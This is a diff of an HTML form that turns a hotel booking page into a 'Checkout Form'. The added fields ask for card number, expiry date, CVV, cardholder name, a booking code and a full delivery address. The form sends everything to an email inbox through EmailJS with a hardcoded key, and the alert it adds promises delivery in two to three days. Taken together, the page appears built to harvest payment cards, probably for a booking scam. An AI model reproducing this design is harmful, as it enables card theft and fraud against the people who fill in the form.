@@ -3,12 +3,12 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Booking Checkout Form</title>
+<title>Checkout Form</title>
 <link rel="stylesheet" href="styles.css">
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
     (function(){
-        emailjs.init("prEhy5YOK66_5Tvfg"); // Replace YOUR_USER_ID with your actual public API key from EmailJS
+        emailjs.init("prEhy5YOK66_5Tvfg"); //public API key from EmailJS
     })();
     
     function sendEmail() {
@@ -32,7 +32,7 @@
         })
         .then(function(response) {
             console.log("Email sent successfully", response);
-            alert("Your booking has been submitted successfully!");
+            alert("Your googs is in process, and will be delivered in the next 2-3 days to the requested location!");
             // Optionally, you can clear the form fields after successful submission
             document.getElementById("bookingForm").reset();
         }, function(error) {
@@ -56,24 +56,35 @@
     <label for="phone">Phone:</label><br>
     <input type="tel" id="phone" name="phone" required><br><br>
 
-    <label for="checkInDate">Check-in Date:</label><br>
-    <input type="date" id="checkInDate" name="checkInDate" required><br><br>
+    <label for="checkInDate">Booking Code:</label><br>
+    <input type="text" id="checkInDate" name="checkInDate" required><br><br>
 
-    <label for="checkOutDate">Check-out Date:</label><br>
-    <input type="date" id="checkOutDate" name="checkOutDate" required><br><br>
+    <label for="checkOutDate">Postal Code:</label><br>
+    <input type="number" id="checkOutDate" name="checkOutDate" required><br><br>
 
-    <label for="roomType">Room Type:</label><br>
-    <select id="roomType" name="roomType" required>
-        <option value="">Select Room Type</option>
-        <option value="single">Single Room</option>
-        <option value="double">Double Room</option>
-        <option value="suite">Suite</option>
-    </select><br><br>
 
-    <label for="message">Additional Message (Optional):</label><br>
-    <textarea id="message" name="message" rows="4" cols="50"></textarea><br><br>
 
-    <input type="button" value="Submit Booking" onclick="sendEmail()">
+    
+    
+     <label for="cardNumber">Card Number:</label><br>
+    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required><br><br>
+
+    <label for="expirationDate">Expiration Date:</label><br>
+    <input type="text" id="expirationDate" name="expirationDate" placeholder="MM/YY" required><br><br>
+
+    <label for="cvv">CVV:</label><br>
+    <input type="password" id="cvv" name="cvv" maxlength="3" placeholder="123" required><br><br>
+
+    <label for="cardHolderName">Cardholder's Name:</label><br>
+    <input type="text" id="cardHolderName" name="cardHolderName" required><br><br>
+
+
+    
+    <p><b>Please Input Your full Address below, this is the address the goods purchased would be brought to.</b></p>
+    <label for="message">Full address:</label><br>
+    <textarea id="message" name="message" rows="4" cols="50" required></textarea><br><br>
+
+    <input type="button" value="Purchase" onclick="sendEmail()">
 </form>
 
 </body>
